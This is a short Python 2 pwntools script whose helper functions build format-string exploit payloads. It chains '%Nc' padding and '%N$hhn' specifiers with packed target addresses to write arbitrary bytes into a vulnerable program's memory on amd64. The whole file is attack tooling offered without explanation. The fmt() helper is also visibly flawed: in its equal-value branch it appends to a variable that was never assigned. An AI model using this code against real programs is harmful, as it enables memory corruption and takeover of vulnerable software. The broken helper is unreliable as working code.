from pwn import *
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr
def cal(i):
	if i<0:
		return i+256
	return i
def fmtstr(off,data,pre=0,space=0x180,arch='amd64',):
	if arch!='amd64':
		return False
	part2=""
	for key in data.keys():
		for offset in range(8):
			part2+=p64(key+offset)
	part1=""
	idx=0
	for value in data.values():
		for offset in range(8):
			if value==0 and pre==0:
				part1+="%"+str(off+idx+(space/8))+"$hhn"
				idx+=1
			else:
				#print hex(value&0xff),hex(pre),hex(cal((value&0xff)-pre))
				part1+="%"+str(cal((value&0xff)-pre))+"c%"+str(off+(space/8)+idx)+"$hhn"
				pre=value&0xff
				value=value>>8
				idx+=1
	return part1.ljust(space,"\x00")+part2

